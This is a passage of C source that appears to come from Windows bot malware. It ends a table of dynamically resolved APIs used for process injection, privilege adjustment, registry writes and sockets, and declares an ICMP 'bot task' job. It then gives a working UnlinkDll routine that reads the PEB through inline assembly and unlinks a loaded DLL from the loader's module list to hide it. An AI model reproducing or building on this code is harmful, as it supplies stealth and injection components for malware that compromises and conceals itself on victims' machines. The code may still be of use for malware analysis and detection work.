	PPEEKNAMEDPIPE				pPeekNamedPipe;
	PPROCESS32FIRST				pProcess32First;
	PPROCESS32NEXT				pProcess32Next;
	PREADFILE					pReadFile;
	PRESUMETHREAD				pResumeThread;
	PSLEEP						pSleep;
	PSUSPENDTHREAD				pSuspendThread;
	PTERMINATEPROCESS			pTerminateProcess;
	PTHREAD32FIRST				pThread32First;
	PTHREAD32NEXT				pThread32Next;
	PVIRTUALALLOCEX				pVirtualAllocEx;
	PVIRTUALFREEEX				pVirtualFreeEx;
	PVIRTUALQUERYEX				pVirtualQueryEx;
	PVIRTUALPROTECT				pVirtualProtect;
	PVIRTUALPROTECTEX			pVirtualProtectEx;
	PWIDECHARTOMULTIBYTE		pWideCharToMultiByte;
	PWRITEFILE					pWriteFile;
	PWRITEPROCESSMEMORY			pWriteProcessMemory;
// =[ advapi32  ]============================
	PADJUSTTOKENPRIVILEGES		pAdjustTokenPrivileges;
	PLOOKUPPRIVILEGEVALUE		pLookupPrivilegeValue;
	POPENPROCESSTOKEN			pOpenProcessToken;
	PREGSETVALUEEX				pRegSetValueEx;
	PREGCREATEKEY				pRegCreateKey;
// =[   ws2_32  ]============================
	PWSACLEANUP					pWSACleanup;
	PWSASTARTUP					pWSAStartup;
	PACCEPT						paccept;
	PBIND						pbind;
	PCLOSESOCKET				pclosesocket;
	PHTONS						phtons;
	PIOCTLSOCKET				pioctlsocket;
	PLISTEN						plisten;
	PRECV						precv;
	PSEND						psend;
	PSOCKET						psocket;
	///++
	PSELECT						pselect;
	PINETADDR					pinet_addr;
	PGETHOSTBYNAME				pgethostbyname;
	PWSAGETLASTERROR			pWSAGetLastError;
	PSHUTDOWN					pshutdown;
	P__WSAFDISSET				p__WSAFDIsSet;
	PCONNECT					pconnect;
	//+
} APIS; // end _apis
#pragma pack()

//==============================
BOOLEAN StartIcmpJob(PBotTask IcmpJob);
//==============================
BOOLEAN
RemoveEntryList(
    IN PLIST_ENTRY Entry
    )
{
    PLIST_ENTRY Blink;
    PLIST_ENTRY Flink;

    Flink = Entry->Flink;
    Blink = Entry->Blink;
    Blink->Flink = Flink;
    Flink->Blink = Blink;
    return (BOOLEAN)(Flink == Blink);
}


VOID UnlinkDll(PVOID ImageBase)
{
	/*
		thx to M4D ( Maddko )
	*/
    PLDR_DATA_TABLE_ENTRY Module;
    PPEB_LDR_DATA pLdrData;

    __asm {
		push	eax	
		mov		eax,fs:[0x30]
		mov		eax,[eax+0x0C]
		mov		pLdrData,EAX
		pop		eax
    }
 
	__try {
		Module = (PLDR_DATA_TABLE_ENTRY)pLdrData->InLoadOrderModuleList.Flink;

		while (	&Module->InLoadOrderLinks != 
				&pLdrData->InLoadOrderModuleList)
		{
			if (Module->DllBase == ImageBase)
			{
				RemoveEntryList(&Module->InLoadOrderLinks);
				break;
			}
        
			Module = (PLDR_DATA_TABLE_ENTRY)Module->InLoadOrderLinks.Flink;
		}
	}	__except(EXCEPTION_EXECUTE_HANDLER){
		__asm { int 3 };
	}
}
